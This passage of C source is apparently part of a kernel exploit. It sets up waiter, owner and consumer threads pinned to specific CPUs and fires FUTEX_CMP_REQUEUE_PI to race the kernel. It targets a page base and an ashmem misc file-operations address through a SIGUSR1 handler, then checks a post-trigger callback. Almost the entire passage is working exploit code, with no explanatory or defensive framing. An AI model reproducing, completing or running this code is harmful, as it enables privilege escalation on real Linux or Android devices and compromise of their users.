    fprintf(stderr, "[futex-v14] waiter pthread_create failed error=%d\n",
            thread_error);
    return 0;
  }
  thread_error = pthread_create(&owner, NULL, owner_thread_fn_v14, NULL);
  if (thread_error != 0) {
    fprintf(stderr, "[futex-v14] owner pthread_create failed error=%d\n",
            thread_error);
    atomic_store(&g_v14_state.stop, 1);
    return 0;
  }
  thread_error =
      pthread_create(&consumer, NULL, consumer_thread_fn_v14, NULL);
  if (thread_error != 0) {
    fprintf(stderr, "[futex-v14] consumer pthread_create failed error=%d\n",
            thread_error);
    atomic_store(&g_v14_state.stop, 1);
    return 0;
  }

  uint64_t ready_deadline = futex_now_ms() + TARGET_FUTEX_READY_TIMEOUT_MS;
  while (!atomic_load(&g_v14_state.waiter_waiting) ||
         !atomic_load(&g_v14_state.owner_started)) {
    if (atomic_load(&g_v14_state.stop) ||
        futex_now_ms() >= ready_deadline) {
      fprintf(stderr, "[futex-v14] thread readiness timeout\n");
      atomic_store(&g_v14_state.stop, 1);
      return 0;
    }
    usleep(TARGET_FUTEX_POLL_USEC);
  }
  futex_v14_dbg("threads-ready");

  int main_cpu = sched_getcpu();
  int waiter_cpu = atomic_load(&g_v14_waiter_cpu);
  int consumer_cpu = atomic_load(&g_v14_consumer_cpu);
  if (main_cpu != 0 || waiter_cpu != 3 || consumer_cpu != 1) {
    fprintf(stderr,
            "[futex-v14] CPU placement failed main=%d waiter=%d consumer=%d\n",
            main_cpu, waiter_cpu, consumer_cpu);
    atomic_store(&g_v14_state.stop, 1);
    return 0;
  }

  usleep(TARGET_FUTEX_PAUSE_USEC);
  futex_v14_dbg("post-100ms-pause");

  errno = 0;
  long requeue_ret =
      futex_op(&g_v14_state.wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1,
               (void *)1, &g_v14_state.pi_target, 0);
  int requeue_errno = errno;
  futex_v14_dbg("post-cmp-requeue-pi");

  while (!atomic_load(&g_v14_state.route_done)) {
    oss_pipe_rw_service_pending();
    usleep(TARGET_FUTEX_RETRY_USEC);
  }
  oss_pipe_rw_service_pending();
  futex_v14_dbg("route-done");

  fprintf(stderr, "[futex-v14] cmp_requeue_pi ret=%ld errno=%d\n",
          requeue_ret, requeue_errno);
  fprintf(stderr,
          "[futex-v14] summary gate_seen=%d sig_ok=%d sched_done=%d "
          "attempt_count=%d success_count=%d cmp_ret=%ld cmp_errno=%d "
          "sched_ret=%d sched_errno=%d handler_result=%d "
          "handler_reason=%s cpu=%d/%d/%d\n",
          atomic_load(&g_v14_gate_seen), atomic_load(&g_v14_sig_ok),
          atomic_load(&g_v14_state.sched_done),
          atomic_load(&g_v14_state.attempt_count),
          atomic_load(&g_v14_state.success_count), requeue_ret, requeue_errno,
          atomic_load(&g_v14_sched_ret), atomic_load(&g_v14_sched_errno),
          sigusr1_last_handler_result(),
          sigusr1_handler_reason_name(sigusr1_last_handler_reason()),
          main_cpu, atomic_load(&g_v14_consumer_cpu),
          atomic_load(&g_v14_waiter_cpu));

  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v14] waiter route not ok\n");
    return 0;
  }
  if (!atomic_load(&g_cb_invoked)) {
    fprintf(stderr, "[futex-v14] verify callback never invoked\n");
    return 0;
  }
  return atomic_load(&g_cb_result);
}

int run_futex_trigger_v14_full(uint64_t page_base,
                                uint64_t ashmem_misc_fops_addr,
                                futex_post_trigger_cb post_trigger_cb,
                                void *ctx) {
  return run_futex_trigger_v14_full_staged(page_base, ashmem_misc_fops_addr,
                                            NULL, 0, 0, post_trigger_cb, ctx);
}

int run_futex_trigger_v14_full_staged(
    uint64_t page_base, uint64_t ashmem_misc_fops_addr,
    int32_t *mutation_state, int32_t pending_state, int32_t mutated_state,
    futex_post_trigger_cb post_trigger_cb, void *ctx) {
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  g_sched_mutation_state = mutation_state;
  g_sched_pending_state = pending_state;
  g_sched_mutated_state = mutated_state;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v14_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  g_sched_mutation_state = NULL;
  return ret;
}
